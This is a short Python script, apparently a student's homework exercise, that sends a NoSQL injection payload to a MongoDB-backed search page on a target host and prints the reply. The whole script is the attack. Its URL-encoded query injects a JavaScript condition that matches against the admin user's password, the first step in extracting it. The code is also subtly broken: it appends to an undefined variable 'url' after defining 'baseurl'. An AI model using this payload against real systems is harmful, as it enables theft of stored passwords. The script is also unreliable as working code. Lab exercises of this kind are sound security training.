import requests, sys
from bs4 import BeautifulSoup

if len(sys.argv) != 2:
    print("Usage: alex_rose_hw1.py <url>")
    sys.exit(1)

baseurl = "http://%s/mongodb/example2" % (sys.argv[1])
args = "/?search=admin%27%20%26%26%20this.password.match(%2F%5e.*%2F)%2F%2F" 
url += args
session = requests.Session()

response = session.get(url)

print(response.text)
